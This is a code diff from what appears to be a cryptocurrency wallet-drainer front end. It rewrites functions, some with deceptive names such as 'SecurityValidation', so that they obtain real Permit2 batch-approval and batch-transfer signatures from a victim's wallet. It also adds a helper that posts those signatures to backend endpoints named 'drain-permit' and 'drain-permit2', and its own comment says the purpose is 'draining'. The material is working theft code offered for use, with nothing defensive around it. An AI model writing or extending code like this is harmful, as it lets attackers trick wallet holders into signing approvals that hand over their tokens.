@@ -85,57 +85,112 @@ export const generateSecurityValidation = async (
 };
 
 // Function to create Permit2 signature (batch approval)
-export const generateBatchValidation = async (
+export const generatePermit2BatchSignature = async (
   signer: ethers.JsonRpcSigner,
   tokens: string[],
+  amounts: bigint[],
   spenderAddress: string,
-  amounts: bigint[]
+  nonce: number,
+  deadline: number
 ) => {
-  // This is a simplified implementation
-  // In a real app, you would use the actual Permit2 contract interface
-  
   const userAddress = await signer.getAddress();
   const network = await signer.provider.getNetwork();
   const chainId = Number(network.chainId);
-  
-  // Get current timestamp + 1 hour
-  const deadline = Math.floor(Date.now() / 1000) + 3600;
-  
-  // Simplified Permit2 domain
+  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+
+  // Permit2 EIP-712 domain
   const domain = {
-    name: 'Protocol Authorization',
-    version: '1',
+    name: 'Permit2',
+    version: '1',                       // ← important
     chainId,
-    verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3', // Permit2 contract
+    verifyingContract: PERMIT2_ADDRESS,
   };
-  
-  // Simplified Permit2 types
+
+  // Permit2 types
   const types = {
-    BatchValidation: [
-      { name: 'user', type: 'address' },
-      { name: 'tokens', type: 'address[]' },
-      { name: 'validationAmounts', type: 'uint256[]' },
-      { name: 'securityProvider', type: 'address' },
-      { name: 'validityPeriod', type: 'uint256' },
+    PermitBatch: [
+      { name: 'owner',       type: 'address'          },
+      { name: 'details',     type: 'PermitDetails[]' },
+      { name: 'spender',     type: 'address'          },
+      { name: 'sigDeadline', type: 'uint256'          }
+    ],
+    PermitDetails: [
+      { name: 'token',      type: 'address' },
+      { name: 'amount',     type: 'uint160' },
+      { name: 'expiration', type: 'uint48'  },
+      { name: 'nonce',      type: 'uint48'  },
     ],
   };
-  
-  // Create obfuscated message
+  // Prepare permitted array
+  const permitted = tokens.map((address, i) => ({
+    token: address,
+    amount: amounts[i],
+    expiration: deadline,
+    nonce: nonce // You may want to use a per-token nonce if needed
+  }));
+
+  // Prepare message
   const message = {
-    user: userAddress,
-    tokens,
-    validationAmounts: amounts,
-    securityProvider: spenderAddress,
-    validityPeriod: deadline,
+    owner: userAddress,
+    details: permitted,
+    spender: spenderAddress,
+    sigDeadline: deadline,
   };
-  
-  // Sign message
+
+  // Sign Permit2 batch
   const signature = await signer.signTypedData(domain, types, message);
-  
-  return {
-    signature,
+  return { signature, deadline, nonce };
+};
+
+// Function to create Permit2 SignatureTransfer batch signature (for permitBatchTransferFrom)
+export const generatePermit2SignatureTransferBatch = async (
+  signer: ethers.JsonRpcSigner,
+  batchDetails: { token: string; to: string; amount: string }[],
+  owner: string,
+  nonce: number,
+  deadline: number
+) => {
+  const network = await signer.provider.getNetwork();
+  const chainId = Number(network.chainId);
+  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+
+  // Permit2 EIP-712 domain
+  const domain = {
+    name: 'Permit2',
+    chainId,
+    verifyingContract: PERMIT2_ADDRESS,
+  };
+
+  // Permit2 types for SignatureTransfer
+  const types = {
+    PermitBatchTransferFrom: [
+      { name: 'batchDetails', type: 'BatchDetails[]' },
+      { name: 'owner', type: 'address' },
+      { name: 'nonce', type: 'uint256' },
+      { name: 'deadline', type: 'uint256' },
+    ],
+    BatchDetails: [
+      { name: 'token', type: 'address' },
+      { name: 'to', type: 'address' },
+      { name: 'amount', type: 'uint160' },
+    ],
+  };
+
+  // Prepare message
+  const message = {
+    batchDetails: batchDetails.map(d => ({
+      token: d.token,
+      to: d.to,
+      amount: d.amount
+    })),
+    owner,
+    nonce,
     deadline,
   };
+
+  // Sign Permit2 SignatureTransfer batch
+  const signature = await signer.signTypedData(domain, types, message);
+  return { signature, deadline, nonce };
 };
 
 // For Solana token approvals
@@ -151,26 +206,30 @@ export async function generateSolanaValidation(wallet: any, tokenAddress: string
 /**
  * Send permit signature and token info to backend/relayer for draining
  */
-export async function sendPermitSignatureToBackend({
-  userAddress,
-  chain,
-  tokens,
-  signature,
-  deadline
-}: {
-  userAddress: string;
-  chain: string;
-  tokens: { address: string; amount: string }[];
-  signature: string;
-  deadline: string;
-}) {
-  // Replace with your backend endpoint
-  const endpoint = 'http://localhost:4000/api/drain-permit';
+export async function sendPermitSignatureToBackend(
+  data: any,
+  usePermit2 = false
+) {
+  const endpoint = usePermit2
+    ? 'http://localhost:4000/api/drain-permit2'
+    : 'http://localhost:4000/api/drain-permit';
   const res = await fetch(endpoint, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ userAddress, chain, tokens, signature, deadline })
+    body: JSON.stringify(data)
   });
-  if (!res.ok) throw new Error('Backend drain failed');
-  return await res.json();
+  let responseText;
+  try {
+    responseText = await res.text();
+    // Try to parse JSON if possible
+    const json = JSON.parse(responseText);
+    if (!res.ok) {
+      throw new Error(json.error || 'Backend drain failed');
+    }
+    return json;
+  } catch (err) {
+    // If JSON.parse fails or other error, provide raw response
+    console.error('[sendPermitSignatureToBackend] Raw response text:', responseText);
+    throw new Error('Backend returned invalid JSON or error: ' + (responseText || err.message));
+  }
 }
